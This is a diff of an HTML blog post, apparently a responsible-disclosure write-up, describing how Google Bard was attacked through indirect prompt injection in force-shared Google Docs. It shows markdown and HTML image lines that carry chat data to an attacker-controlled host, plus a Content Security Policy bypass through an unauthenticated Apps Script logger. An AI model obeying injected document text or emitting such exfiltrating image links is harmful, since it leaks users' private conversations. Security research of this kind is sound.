@@ -3,7 +3,7 @@
 <head prefix="og: http://ogp.me/ns#">
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-  <meta property="og:title" content=" Google Bard - Prompt Injection to Data Exfiltration &middot;  Embrace The Red" />
+  <meta property="og:title" content=" Hacking Google Bard - From Prompt Injection to Data Exfiltration &middot;  Embrace The Red" />
   
   <meta property="og:site_name" content="Embrace The Red" />
   <meta property="og:url" content="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/" />
@@ -11,7 +11,7 @@
   
   <meta property="og:type" content="article" />
   
-  <meta property="og:article:published_time" content="2023-10-24T16:34:01-07:00" />
+  <meta property="og:article:published_time" content="2023-11-02T15:34:01-07:00" />
   
   <meta property="og:article:tag" content="aiml" />
   
@@ -26,7 +26,7 @@
   
 
   <title>
-     Google Bard - Prompt Injection to Data Exfiltration &middot;  Embrace The Red
+     Hacking Google Bard - From Prompt Injection to Data Exfiltration &middot;  Embrace The Red
   </title>
 
   <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
@@ -42,9 +42,9 @@
   
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@wunderwuzzi23">
-<meta name="twitter:title" content="Google Bard: Prompt Injection to Data Exfiltration">
-<meta name="twitter:description" content="Google Bard allowed an adversary to inject instructions via documents and exfiltrate the chat history by injecting an markdown image tag.">
-<meta name="twitter:image" content="https://embracethered.com/blog/images/2023/Bard-Exfil-Image-Markdown.png">
+<meta name="twitter:title" content="Hacking Google Bard: From Prompt Injection to Data Exfiltration">
+<meta name="twitter:description" content="Google Bard allowed an adversary to inject instructions via documents and exfiltrate the chat history by injecting a markdown image tag.">
+<meta name="twitter:image" content="https://embracethered.com/blog/images/2023/bard-exfil-logo.png">
 
 <meta name="twitter:creator" content="@wunderwuzzi23">
 
@@ -117,13 +117,13 @@
 
 <article>
   <header>
-    <h1 class="text-primary">Google Bard - Prompt Injection to Data Exfiltration</h1>
+    <h1 class="text-primary">Hacking Google Bard - From Prompt Injection to Data Exfiltration</h1>
     <div class="post-meta clearfix">
     
       <div class="post-date pull-left">
         Posted on
-        <time datetime="2023-10-24T16:34:01-07:00">
-          Oct 24, 2023
+        <time datetime="2023-11-02T15:34:01-07:00">
+          Nov 2, 2023
         </time>
       </div>
     
@@ -143,50 +143,49 @@
     </div>
   </header>
   <section>
-    <p>Recently Google Bard got some <a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">powerful updates</a>, including Extensions. They allow Bard to access YouTube, search for flights and hotels, but also to access a user&rsquo;s personal documents and emails.</p>
-<p><strong>So, Bard can access and analyze your Drive, Docs and Gmail!</strong></p>
-<p>When <code>Extensions</code> shipped I was able to quickly validate that Indirect Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize the titles, and it also worked with <code>Google Docs</code>.</p>
-<p>Lo and behold it followed the instructions:</p>
+    <p>Recently Google Bard got some <a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">powerful updates</a>, including Extensions. Extensions allow Bard to access YouTube, search for flights and hotels, and also to access a user&rsquo;s personal documents and emails.</p>
+<p><strong>So, Bard can now access and analyze your Drive, Docs and Gmail!</strong></p>
+<p>When <code>Extensions</code> shipped I was able to quickly validate that Indirect Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with <code>Google Docs</code>.</p>
+<p>Turns out that it followed the instructions:</p>
 <p><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845"><img src="/blog/images/2023/google-bard-pi.png" alt="Google Bard Prompt Injection Demo"></a></p>
 <p>At that point it was clear that things will become a lot more interesting.</p>
+<p>A shout out to <a href="https://twitter.com/rez0__">Joseph Thacker</a> and <a href="https://twitter.com/KGreshake">Kai Greshake</a> for brainstorming and collaborating on this together.</p>
 <h2 id="whats-next">What&rsquo;s next?</h2>
-<p>The attack vector via Emails or Google Docs are interesting threats, because these can be delivered to users without their consent.</p>
+<p>Indirect Prompt Injection attacks via Emails or Google Docs are interesting threats, because these can be delivered to users without their consent.</p>
 <p><strong>Imagine an attacker force-sharing Google Docs with victims!</strong></p>
-<p>The next step was attack to explore to see if data exfiltration from the chat context would be possible.</p>
+<p>When the victim searches or interacts with the attacker&rsquo;s document using Bard the prompt injection can kick in!</p>
+<p><strong>Scary stuff!</strong></p>
+<p>A common vulnerability in LLM apps is chat history exfiltration via rendering of hyperlinks and images.</p>
 <h2 id="the-vulnerability---image-markdown-injection">The Vulnerability - Image Markdown Injection</h2>
-<p>When Google&rsquo;s LLM returns text it might return markdown elements, which Google Bard will render as HTML! This includes the capability to render images. It&rsquo;s a well known vulnerability many LLM applications are vulnerable to.</p>
+<p>When Google&rsquo;s LLM returns text it can return markdown elements, which Bard will render as HTML! This includes the capability to render images.</p>
 <p>Imagine the LLM returns the following text:</p>
 <pre tabindex="0"><code>![Data Exfiltration in Progress](https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION])
 </code></pre><p>This will be rendered as an HTML image tag with a <code>src</code> attribute pointing to the <code>attacker</code> server.</p>
 <pre tabindex="0"><code>&lt;img src=&quot;https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]&quot;&gt;
 </code></pre><p>The browser will automatically connect to the URL without user interaction to load the image.</p>
 <p>Using the power of the LLM we can summarize or access previous data in the chat context and append it accordingly to the URL.</p>
-<p>Thanks to Kai Greshake and Joseph Thacker for hacking on this together. We had some really fruitful brainstorming and hacking sessions.</p>
-<p>When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it. However image rendering was blocked by Google&rsquo;s Content Security Policy.</p>
-<h2 id="sharing-of-attack-documents-with-others">Sharing of attack documents with others</h2>
-<p>With <code>Google Docs</code> the intersting attack avenue is sharing of documents.</p>
-<p>As mentioned ealier, an attacker can force-share a document with a victim directly into the their Google Drive. When the victim searches for documents with Bard the prompt injection can kick in!</p>
-<p><strong>Scary stuff!</strong></p>
+<p>When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it.</p>
+<p>However image rendering was blocked by Google&rsquo;s Content Security Policy.</p>
 <h2 id="content-security-policy-bypass">Content Security Policy Bypass</h2>
-<p>To render images from an attacker controlled server there was an obstacle. Google has put a Content Security Policy (CSP) that prevents loading images from arbitary locations.</p>
-<p><a href="/blog/images/2023/google-bard-csp-blocked.png"><img src="/blog/images/2023/google-bard-csp-blocked.png" alt="CSP policy"></a></p>
+<p>To render images from an attacker controlled server there was an obstacle. Google has a Content Security Policy (CSP) that prevents loading images from arbitary locations.</p>
+<p><a href="/blog/images/2023/bard-csp2.png"><img src="/blog/images/2023/bard-csp2.png" alt="CSP policy"></a></p>
 <p>The CSP contains locations such as <code>*.google.com</code> and <code>*.googleusercontent.com</code>, which seemed quite broad.</p>
-<p><strong>Gut feel was that there should be a bypass!</strong></p>
-<p>After some research I learned about <code>Google AppScript</code>, that seemed promising.</p>
-<p><code>AppScripts</code> are like Office Macros. And they can be invoked via a URL and run on the <code>script.google.com</code> (respectiveley <code>googleusercontent.com</code>) domains!!</p>
-<p><img src="/blog/images/2023/google-bard-appscript.png" alt="appscript bypass"></p>
+<p><strong>It seemed that there should be a bypass!</strong></p>
+<p>After some research I learned about <code>Google Apps Script</code>, that seemed most promising.</p>
+<p><code>Apps Scripts</code> are like Office Macros. And they can be invoked via a URL and run on the <code>script.google.com</code> (respectiveley <code>googleusercontent.com</code>) domains!!</p>
+<p><img src="/blog/images/2023/google-bard-appscript.png" alt="appsscript bypass"></p>
 <p>So, this seemed like a winner!</p>
 <h2 id="writing-the-bard-logger">Writing the Bard Logger</h2>
-<p>Equipped with that knowledge I wrote a &ldquo;Bard Logger&rdquo; in <code>AppScript</code>.</p>
-<p>The logger code writes all query parameters appended to the invocation URL to a <code>Google Doc</code>, which is the exfiltration destination.</p>
+<p>Equipped with that knowledge a &ldquo;Bard Logger&rdquo; in <code>Apps Script</code> was implemented.</p>
+<p>The logger writes all query parameters appended to the invocation URL to a <code>Google Doc</code>, which is the exfiltration destination.</p>
 <p><a href="/blog/images/2023/google-bard-logger.png"><img src="/blog/images/2023/google-bard-logger.png" alt="Bard Logger"></a></p>
-<p>For a second it seemed like it&rsquo;s not possible to expose such an endpoint anonmymously, but after some clicking through the AppScript UI I found a setting to make it have no authentication.</p>
+<p>For a second it seemed like it&rsquo;s not possible to expose such an endpoint anonymously, but after some clicking through the <code>Apps Script</code> UI I found a setting to make it have no authentication.</p>
 <p>So, now all the pieces were ready:</p>
 <ol>
 <li>Google Bard is vulnerable to Indirect Prompt Injection via data from Extensions</li>
 <li>There is vulnerabilty in Google Bard that allows rendering of images (zero click)</li>
-<li>A malicious Google Doc with a Prompt Injection Instructions to exploit the vulnerability</li>
-<li>A logging endpoint on google.com to receive the data when the image is loaded</li>
+<li>A malicious Google Doc Prompt Injection Instructions to exploit the vulnerability</li>
+<li>A logging endpoint on <code>google.com</code> to receive the data when the image is loaded</li>
 </ol>
 <p>But, will it work?</p>
 <h2 id="demo-and-responsible-disclosure">Demo and Responsible Disclosure</h2>
@@ -197,7 +196,7 @@
 </div>
 
 <p>In the video you can see how the chat history of the user is exfiltrated once the malicious <code>Google Doc</code> is brought into the chat context.</p>
-<p>If you prefer to not watch the video, below are step by step screenshots.</p>
+<p>If you prefer screenshots over video, look further below.</p>
 <h2 id="show-me-the-shell-code">Show me the Shell Code</h2>
 <p><strong>Shell Code is natural language these days.</strong></p>
 <p>This is the <code>Google Doc</code> including the payload used to perform the prompt injection and data exfiltration:</p>
@@ -212,21 +211,21 @@
 <a href="/blog/images/2023/bard-data-exfil-data.png"><img src="/blog/images/2023/bard-data-exfil-data.png" alt="Bard Renders Image"></a></p>
 </li>
 <li>
-<p>User navigates to the Google Doc (The Bard2000), which leads to injection of attacker instructions, and rendering of the image:
+<p>User navigates to the Google Doc (The Bard2000), which leads to injection of the attacker instructions, and rendering of the image:
 <a href="/blog/images/2023/Bard-Exfil-Image-Markdown.png"><img src="/blog/images/2023/Bard-Exfil-Image-Markdown-crop.png" alt="Bard Renders Image"></a></p>
 </li>
 <li>
-<p>The attacker&rsquo;s server received the encoded data, including the secret on the page:
+<p>The attacker receives the data via the Bard Logger Apps Script into a Google Doc:
 <a href="/blog/images/2023/Bard-Exfil-BardLogger-Results.png"><img src="/blog/images/2023/Bard-Exfil-BardLogger-Results.png" alt="bard logger results"></a></p>
 </li>
+<li>
+<p><strong>That&rsquo;s it. Mission accomplished.</strong></p>
+</li>
 </ul>
-<p>That&rsquo;s it!</p>
 <p>This chain was a bit more complex as others we discussed previously (like Bing Chat, ChatGPT or Claude), because a bypass for the <code>CSP</code> had to be found.</p>
 <h2 id="googles-fix">Google&rsquo;s Fix</h2>
-<p>The issue was reported to Google VRP on September, 19 2023. After an inquiry on October 19, 2023 to check on status, since I wanted to demo at Ekoparty 2023, Google confirmed it&rsquo;s fixed and gave green light for the talk.</p>
+<p>The issue was reported to Google VRP on September, 19 2023. After an inquiry on October 19, 2023 to check on status, since I wanted to demo at <a href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023</a>, Google confirmed it&rsquo;s fixed and gave green light for including the demo in the talk.</p>
 <p>It&rsquo;s not yet entirely clear what the fix was at the moment. The CSP was not modified, and images still render - so, it seems some filtering was put in place to prevent insertion of data into the URL. That will be something to explore next!</p>
-<h2 id="shout-out">Shout Out</h2>
-<p>Again, a shout out to Kai Greshake (@KGreshake) and Joseph Thacker (@rez0__) for the collaboration and brainstorming on this one. Both are super talented and skilled hackers and researchers you should follow.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>This vulnerability shows the power and degrees of freedom an adversary has during an Indirect Prompt Injection attack.</p>
 <p>Thanks to the Google Security and Bard teams for fixing this issue promptly.</p>
@@ -239,7 +238,8 @@
 <h2 id="references">References</h2>
 <ul>
 <li><a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">Google Bard Extension Announcment</a>,</li>
-<li><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845">First Indirect Prompt Injections with Google Bard</a></li>
+<li><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845">Indirect Prompt Injections with Google Bard</a></li>
+<li><a href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023 Prompt Injection Talk</a></li>
 </ul>
 <h2 id="appendix">Appendix</h2>
 <p>Full Prompt Injection in the Google Doc:</p>
